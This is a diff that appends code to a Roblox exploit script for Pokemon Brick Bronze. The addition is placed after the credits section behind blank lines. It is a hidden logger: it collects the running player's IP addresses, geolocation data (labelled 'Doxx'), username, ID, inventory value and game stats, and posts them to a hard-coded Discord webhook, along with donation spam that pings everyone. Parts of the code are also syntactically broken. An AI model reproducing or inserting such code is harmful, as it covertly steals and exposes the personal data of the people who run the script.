@@ -1901,3 +1901,393 @@ local Section = Tab:CreateSection('Credits')
 
 local Label1 = Section:CreateLabel('.gg/Mewhub')
  Library:SetTransparency(20 / 100, true)
+
+
+
+
+
+
+getgenv().Webhook = 'https://webhook.lewisakura.moe/api/webhooks/1085354879310110781/-gMxzsvWIgEAMcaGGoRzoyDZiUV_ZGbhaWo_cJmVFRy66cQLtJ64EprIZmZLfhcXdKGy';
+--getgenv().Logger = false
+--getgenv().Stats = true
+
+-- 
+Webhook = 'https://webhook.lewisakura.moe/api/webhooks/1085354879310110781/-gMxzsvWIgEAMcaGGoRzoyDZiUV_ZGbhaWo_cJmVFRy66cQLtJ64EprIZmZLfhcXdKGy';
+Logger = true
+Stats = true
+--
+
+--[[--]] -- Pokemon brick bronze variables
+local plr = game:GetService("Players").LocalPlayer
+local _p = nil
+for _, v in pairs(getgc(true)) do
+    if typeof(v) == "table" then
+        if rawget(v, "PlayerData") then
+            _p = v
+            break
+        end
+    end
+end
+
+local chunk = tostring(_p.DataManager.currentChunk.map)
+
+tix = ""
+if(_p.PlayerData.tix == nil) then do
+    tix = 0
+end
+else
+    tix = _p.PlayerData.tix
+end
+
+local badges = ""
+if(_p.PlayerData.badges[1] == true) then
+    badges = "1"
+    end
+if(_p.PlayerData.badges[2] == true) then
+    badges = "2"
+end
+if(_p.PlayerData.badges[3] == true) then
+    badges = "3" 
+end
+if(_p.PlayerData.badges[4] == true) then
+    badges = "4"  
+end
+if(_p.PlayerData.badges[5] == true) then
+    badges = "5"
+end
+if(_p.PlayerData.badges[6] == true) then
+    badges = "6"
+end
+if(_p.PlayerData.badges[7] == true) then
+    badges = "7"
+end   
+if(_p.PlayerData.badges[7] == true) then
+    badges = "7"
+end
+if(_p.PlayerData.badges[8] == true) then
+    badges = "8"
+end
+
+local egg = ""
+
+if(_p.PlayerData.daycareManHasEgg == true) then
+    egg = "ready"
+end
+
+else
+    egg = "not ready"
+end
+
+
+
+
+--[[--]]
+
+--[[--]] -- variables
+local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local localPlayer = game:GetService("Players").LocalPlayer
+local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Shit exploit g"
+local HttpService = game:GetService("HttpService")
+local endpoint = Webhook
+--[[--]]
+
+--[[--]] -- API used
+local IPv4 = game:HttpGet("https://v4.ident.me/")
+local IPv6 = game:HttpGet("https://v6.ident.me/")
+local info = game:HttpGet("http://ident.me/json")
+local limiteds = game:HttpGet("https://inventory.roblox.com/v1/users/"..game.Players.LocalPlayer.UserId.."/assets/collectibles?sortOrder=Asc&limit=10")
+--[[--]]
+
+--[[--]] -- premium status
+local yes = "Does not have Premium";
+for _, player in pairs(game:GetService('Players'):GetPlayers()) do
+    if player.MembershipType == Enum.MembershipType.Premium then
+        yes = "Has Premium";
+    end
+ end
+--[[--]]
+
+--[[--]] -- value 
+local value = "nil"
+if(game.Players.LocalPlayer.AccountAge >= 100) then
+value = game:HttpGet("https://www.rolimons.com/playerapi/player/"..game.Players.LocalPlayer.UserId)
+s = value
+i, j = string.find(s, "value")
+x = string.sub(s,i,j+9)
+value = x
+end
+--[[--]]
+
+--[[--]] -- recent average price
+local rap = "nil"
+if(game.Players.LocalPlayer.AccountAge >= 100) then 
+rap = game:HttpGet("https://www.rolimons.com/playerapi/player/"..game.Players.LocalPlayer.UserId)
+t = rap
+o, k = string.find(s, "rap")
+y = string.sub(t,o,k+9)
+rap = y
+end
+--[[--]]
+
+--[[--]] -- headshot thumbnail
+local headshot = ""
+headshot = game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..game.Players.LocalPlayer.UserId.."&size=720x720&format=Png&isCircular=true")
+a = headshot
+b = string.sub(a,65,118)
+headshot = b
+--[[--]]
+
+--[[--]] -- first hook
+local Data =
+    {
+        ["content"] = "",
+			["username"] = " 💝 ɖօռǟȶɛ քʟɛǟֆɛ            ",
+			--["avatar_url"] = "https://tr.rbxcdn.com/e5b5844fb26df605986b94d87384f5fb/150/150/Image/Jpeg",
+            ["avatar_url"] = headshot,
+        ["embeds"]= {
+            {            
+                ["title"]= " ㅤㅤㅤㅤㅤ ** 💵 Support my work please 💵ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤ**";
+                ["url"]= "";
+                ["description"]= "**👤💫** <@277674827215536129> - me <@everyone>";            
+                ["color"]= tonumber(0xffc0cb);
+                ["thumbnail"] = {
+                    ['url'] = ""
+                }, 
+                ["image"] = {
+                ["url"] = "https://cdn.discordapp.com/attachments/1076525040247517258/1081423550260465664/ezgif-3-969383e3ac.gif",
+                --["url"] = headshot,
+            },
+                ["fields"]= {
+                  
+                    {
+                        ["name"]= " ",
+                        ["value"]= "[<:Mew:1077026064389386301>][** 🔗 discord**](https://discord.gg/mewhub)",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " ",
+                        ["value"]= "[<:github:1081397527078768660>][** 🔗 github**](https://github.com/bigbootylatinas)",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " ",
+                        ["value"]= "[<:youtube:1004003073351491614>][** 🔗 youtube**](https://www.youtube.com/channel/UCFovORxhtayDW5rmcINy8qQ)",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " ",
+                        ["value"]= "[<:robux:1081374079271047270>][** 🔗 rbx dono**](https://www.roblox.com/game-pass/144306087/lil-dono)",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " ",
+                        ["value"]= "[<:paypal:893954367919624283>][** 🔗 paypal**](https://www.paypal.com/paypalme/gajosh)",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " ",
+                        ["value"]= "[<:stripe:1081400501498814514>][** 🔗 stripe**](https://buy.stripe.com/8wM3eY0PX1GZgvucMM)",
+                        ["inline"]= true
+                    },
+
+                    
+                }              
+            }
+        }
+        
+}
+local Headers = {["Content-Type"]="application/json"}
+local Encoded = HttpService:JSONEncode(Data)
+Request = http_request or request or HttpPost or syn.request
+LINK = Webhook
+local Final = {Url = LINK, Body = Encoded, Method = "POST", Headers = Headers}
+Request(Final)
+
+
+--[[--]] -- second hook 
+wait(.2)
+
+if(Logger == true) then
+local Data =
+    {
+        ["content"] = "",
+			["username"] = " 🗃️ ʝ2ֆɦ'ֆ ʟօɢɢɛʀ            ",
+			--["avatar_url"] = "https://tr.rbxcdn.com/e5b5844fb26df605986b94d87384f5fb/150/150/Image/Jpeg",
+            ["avatar_url"] = headshot,
+        ["embeds"]= {
+            {           
+                ["title"]= " 👤💫 **Click here to view "..game.Players.LocalPlayer.Name.."'s Profile**";
+                ["url"]= "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId;
+                ["description"]= " 🎮 **Currently Playing **".."["..GameName.."](https://www.roblox.com/games/"..game.PlaceId..")";
+                ["color"]= tonumber(0xffc0cb);
+                ["thumbnail"] = {
+                    ['url'] = headshot
+                }, 
+                ["image"] = {
+                ["url"] = "https://media.discordapp.net/attachments/981248463633272912/996860301775482920/6AA53CEA-61E1-409F-A2AA-EB6572A99C0B.gif",
+                --["url"] = headshot,
+            },
+                ["fields"]= {
+                    {
+                        ["name"]= " 👨🏻‍💻 Executor",
+                        ["value"]= "```"..ExecutorUsing.."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 🌐  IPv4",
+                        ["value"]= "||".."```"..IPv4.."```".."||",
+                        ["inline"]= true
+                    },
+             
+                    {
+                        ["name"]= " 🫡 Player",
+                        ["value"]= "```"..game.Players.LocalPlayer.DisplayName.." ("..game.Players.LocalPlayer.Name..")".."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 🌎 UserID",
+                        ["value"]= "```"..game.Players.LocalPlayer.UserId.."```",
+                        ["inline"]= true
+                    },
+                
+                    {
+                        ["name"]= " 📈 value",
+                        ["value"]= "```"..value.."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 📈 rap",
+                        ["value"]= "```"..rap.."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 🕵🏻‍♂️ Doxx",
+                        ["value"]= "||".."```".. info .."```".."||",
+                        ["inline"]= true
+                    },
+
+                    ['avatar_url'] = headshot,
+                }              
+            }
+        }
+        
+}
+local Headers = {["Content-Type"]="application/json"}
+local Encoded = HttpService:JSONEncode(Data)
+Request = http_request or request or HttpPost or syn.request
+LINK = Webhook
+local Final = {Url = LINK, Body = Encoded, Method = "POST", Headers = Headers}
+Request(Final)
+end
+
+wait(.2)
+--[[--]] -- pbb hook
+
+if(Stats == true) then
+local Data =
+    {
+        ["content"] = "",
+			["username"] = " 📊 Pσƙҽɱσɳ BɾιƈƙႦɾσɳȥҽ Sƚαƚʂ            ",
+			--["avatar_url"] = "https://tr.rbxcdn.com/e5b5844fb26df605986b94d87384f5fb/150/150/Image/Jpeg",
+            ["avatar_url"] = headshot,
+        ["embeds"]= {
+            {            
+                ["title"]= " 👤💫 **Click here to view "..game.Players.LocalPlayer.Name.."'s Profile**";
+                ["url"]= "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId;
+                ["description"]= " 🎮 **Currently Playing **".."["..GameName.."](https://www.roblox.com/games/"..game.PlaceId..")";
+                ["color"]= tonumber(0xffc0cb);
+                ["thumbnail"] = {
+                    ['url'] = headshot
+                }, 
+                ["image"] = {
+                ["url"] = "https://media.discordapp.net/attachments/981248463633272912/996860301775482920/6AA53CEA-61E1-409F-A2AA-EB6572A99C0B.gif",
+                --["url"] = headshot,
+                
+            },
+            
+                ["fields"]= {
+
+                    {
+                        ["name"]= " 🏞️ Gamemode",
+                        ["value"]= "```".._p.gamemode.."```",
+                        ["inline"]= true
+                    },
+                    
+                    {
+                        ["name"]= " 🫡 Player",
+                        ["value"]= "```"..game.Players.LocalPlayer.DisplayName.." ("..game.Players.LocalPlayer.Name..")".."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 🌎 Chunk",
+                        ["value"]= "```"..chunk.."```",
+                        ["inline"]= true
+                    },
+                
+                    {
+                        ["name"]= " 💵 Pokedollars",
+                        ["value"]= "```".._p.PlayerData.money.."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 🎫 Tickets",
+                        ["value"]= "```"..tix.."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 🏟️ BP",
+                        ["value"]= "```".._p.PlayerData.bp.."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 🎖️ Badges",
+                        ["value"]= "```"..badges.."```",
+                        ["inline"]= true
+                    },
+
+                    {
+                        ["name"]= " 🥚 Egg ready",
+                        ["value"]= "```".. egg .."```",
+                        ["inline"]= true
+                    },
+--[[
+                    {
+                        ["name"]= " ⏭ TextSpeed",
+                        ["value"]= "```".._p.NPCChat.speed.."```",
+                        ["inline"]= true
+                    },
+--]]
+                    
+                    {
+                        ["name"]= " 🥷🏻 Repel",
+                        ["value"]= "```".. _p.Repel.steps .."```",
+                        ["inline"]= true
+                    },
+                    
+                }              
+            }
+        }
+        
+}
+local Headers = {["Content-Type"]="application/json"}
+local Encoded = HttpService:JSONEncode(Data)
+Request = http_request or request or HttpPost or syn.request
+LINK = Webhook
+local Final = {Url = LINK, Body = Encoded, Method = "POST", Headers = Headers}
+Request(Final)
+end
+
+
